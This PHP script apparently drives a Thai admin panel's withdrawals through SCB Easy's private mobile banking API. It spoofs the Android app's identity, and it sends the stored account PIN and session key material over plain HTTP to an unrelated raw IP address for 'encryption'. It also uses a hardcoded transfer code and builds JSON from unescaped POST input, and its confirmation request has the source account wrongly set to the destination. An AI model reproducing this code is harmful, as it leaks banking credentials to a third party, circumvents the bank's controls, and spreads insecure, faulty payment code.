<?php

$sql = "SELECT * FROM bank WHERE name_bank='ธนาคารไทยพาณิชย์' AND status_bank='เปิด' ORDER BY id DESC LIMIT 1";
$result = $class_admin->load_date_sql($sql);
$row = mysqli_fetch_assoc($result);


$GLOBALS["accountFrom"]=$row['bankacc_bank'];  //เลขบัญชีตัวเอง
$pin=$row['pin_bank'];
$deviceId=$row['device'];

$scbversion = "Android/10;FastEasy/3.53.0/5618";

function code($value){
  $value=trim($value);

  if ($value=="ธ.ไทยพาณิชย์") {
    return '014';
  }

  if ($value=="ธ.กรุงเทพ") {
    return '002';
  }

  if ($value=="ธ.กสิกรไทย") {
    return '004';
  }

  if ($value=="ธ.กรุงไทย") {
    return '006';
  }

  if ($value=="ธ.ทหารไทยธนชาติ") {
    return '011';
  }

  if ($value=="ธ.กรุงศรีอยุธยา") {
    return '025';
  }
  if ($value=="ธ.ออมสิน") {
    return '030';
  }

  if ($value=="ธ.ก.ส.") {
    return '034';
  }
  
  if ($value=="ธ.ซีไอเอ็มบี") {
    return '033';
  }
  
  if ($value=="ธ.เกียรตินาคินภัทร") {
    return '033';
  }
  
  if ($value=="ธ.ทิสโก้") {
    return '067';
  }
  
  if ($value=="ธ.ยูโอบี") {
    return '024';
  }
  
  if ($value=="ธ.อิสลาม") {
    return '066';
  }
  
  if ($value=="ธ.ไอซีบีซี") {
    return '070';
  }
if ($value=="ธ.แลนด์แอนด์เฮาส์") {
    return '073';
  }
  if ($value=="ธ.อ.ส") {
    return '033';
  }
}






$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://fasteasy.scbeasy.com:8443/v3/login/preloadandresumecheck',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_HEADER=> 1,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"deviceId":"'.$deviceId.'","jailbreak":"0","tilesVersion":"41","userMode":"INDIVIDUAL"}',
  CURLOPT_HTTPHEADER => array(
    'Accept-Language:      th',
    'scb-channel:  APP',
    'user-agent: '.$scbversion,
    'Content-Type:  application/json; charset=UTF-8',
    'Hos:  fasteasy.scbeasy.com:8443',
    'Connection:  close',
  ),
));

$response = curl_exec($curl);
curl_close($curl);

print "<pre>";
print_r($response);
print "</pre>";

preg_match_all('/(?<=Api-Auth: ).+/', $response, $Auth);
$Auth=$Auth[0][0];

if ($Auth=="") {
  $message['status'] = "error";
  $message['info'] = "Auth error";
}else{


$curl1 = curl_init();
curl_setopt_array($curl1, array(
  CURLOPT_URL => 'https://fasteasy.scbeasy.com/isprint/soap/preAuth',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"loginModuleId":"PseudoFE"}',
  CURLOPT_HTTPHEADER => array(
    'Api-Auth: '.$Auth,
    'Content-Type: application/json',
  ),
));

$response1 = curl_exec($curl1);
curl_close($curl1);
$data = json_decode($response1,true);

$hashType=$data['e2ee']['pseudoOaepHashAlgo'];
$Sid=$data['e2ee']['pseudoSid'];
$ServerRandom=$data['e2ee']['pseudoRandom'];
$pubKey=$data['e2ee']['pseudoPubKey'];



$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "http://154.208.140.86:3000/pin/encrypt", // hash pin 
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => "Sid=".$Sid."&ServerRandom=".$ServerRandom."&pubKey=".$pubKey."&pin=".$pin."&hashType=".$hashType,
  CURLOPT_HTTPHEADER => array(
    "Content-Type: application/x-www-form-urlencoded"
  ),
));

$response = curl_exec($curl);
curl_close($curl);


$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://fasteasy.scbeasy.com/v1/fasteasy-login',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_HEADER=> 1,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"deviceId":"'.$deviceId.'","pseudoPin":"'.$response.'","pseudoSid":"'.$Sid.'"}',
  CURLOPT_HTTPHEADER => array(
    'Accept-Language: th',
                'scb-channel: app',
                'user-agent: '.$scbversion,
                'Content-Type: application/json; charset=UTF-8',
                'Api-Auth: ' . $Auth,
                'Host: fasteasy.scbeasy.com:8443',
                'Connection: Keep-Alive',
                'Accept-Encoding: gzip'
  ),
));

$response_auth = curl_exec($curl);
curl_close($curl);

preg_match_all('/(?<=Api-Auth:).+/', $response_auth, $Auth_result);
$Auth1=$Auth_result[0][0];

if ($Auth1=="") {
  $message['status'] = "error";
  $message['info'] = "Auth error2";
}else{
	


if(isset($_POST['vsgersg456498'])) {


$accountTo = $_POST['accountTo'];
$namebank = $_POST['accountToBankCode'];
$accountToBankCode = code($_POST['accountToBankCode']);
$amount = $_POST['amount']; 
$key_input = $_POST['key_input'];


if ($key_input=='1596') {

$transferType="ORFT";

if ($accountToBankCode=='014') {
  $transferType="3RD";
}


$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://fasteasy.scbeasy.com/v2/transfer/verification",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS =>'{"accountFrom":"'.$GLOBALS["accountFrom"].'","accountFromType":"2","accountTo":"'.$accountTo.'","accountToBankCode":"'.$accountToBankCode.'","amount":"'.$amount.'","annotation":null,"transferType":"'.$transferType.'"}',
  CURLOPT_HTTPHEADER => array(
    'Accept-Language:      th',
    'Api-Auth: '.$Auth1,
    'Content-Type:  application/json;charset=UTF-8'
  ),
));

$response = curl_exec($curl);
$data = json_decode($response,true);
$check=$data['status']['description'];


if ($check=="จำนวนเงินในบัญชีไม่เพียงพอ กรุณาเลือกบัญชีอื่น") {
  $message['status'] = "error";
  $message['info'] = "ยอดเงินในบัญชีไม่เพียงพอ";
}else{
	
$totalFee=$data['data']['totalFee'];
$scbFee=$data['data']['scbFee'];
$botFee=$data['data']['botFee'];
$channelFee= $data['data']['channelFee'];
$accountFromName= $data['data']['accountFromName'];
$accountTo= $data['data']['accountTo'];
$accountToName= $data['data']['accountToName'];
$accountToType= $data['data']['accountToType'];
$accountToDisplayName= $data['data']['accountToDisplayName'];
$accountToBankCode= $data['data']['accountToBankCode'];
$pccTraceNo= $data['data']['pccTraceNo'];
$transferType= $data['data']['transferType'];
$feeType= $data['data']['feeType'];
$terminalNo= $data['data']['terminalNo'];
$sequence= $data['data']['sequence'];
$transactionToken= $data['data']['transactionToken'];
$bankRouting= $data['data']['bankRouting'];
$fastpayFlag= $data['data']['fastpayFlag'];
$ctReference= $data['data']['ctReference'];



$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://fasteasy.scbeasy.com/v3/transfer/confirmation",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS =>"{\"accountFrom\":\"$accountTo\",\"accountFromName\":\"" .$accountFromName. "\",\"accountFromType\":\"2\",\"accountTo\":\"" .$accountTo. "\",\"accountToBankCode\":\"" .$accountToBankCode. "\",\"accountToName\":\"" . $accountToName . "\",\"amount\":\"" . $amount . "\",\"botFee\":0.0,\"channelFee\":0.0,\"fee\":0.0,\"feeType\":\"\",\"pccTraceNo\":\"" . $pccTraceNo . "\",\"scbFee\":0.0,\"sequence\":\"" . $sequence. "\",\"terminalNo\":\"" . $terminalNo . "\",\"transactionToken\":\"" . $transactionToken. "\",\"transferType\":\"" . $transferType. "\"}",
  CURLOPT_HTTPHEADER => array(
    'Api-Auth: '.$Auth1,
    'Content-Type:  application/json;charset=UTF-8'
  ),
));

$response = curl_exec($curl);
curl_close($curl);
$data = json_decode($response,true);
$status=$data['status']['description'];


if ($status=="สำเร็จ") {
	
	
		$load_setting = $class_admin->load_db_setting();
		$sMessage = "โอนเงินออก SCB \nจำนวนเงิน ".$amount." บาท \nเข้า".$namebank." \nเลขบัญชี ".$accountTo." \nผู้ทำรายการ  ".$_SESSION["name_ad"];
		$token = $load_setting->linewithdraw;
		$run_class = $class_admin->notify_line($sMessage,$token);


		$message['status'] = "success";
		$message['info'] = "โอนเงินสำเร็จ";
  //echo json_encode($data);
}else{
		$message['status'] = "error";
		$message['info'] = "โอนเงินไม่สำเร็จ";
}

}


}else{
	
  $message['status'] = "error";
  $message['info'] = "รหัสโอนเงินไม่ถูกต้อง";
  
}

}



}
}

echo json_encode($message);
?>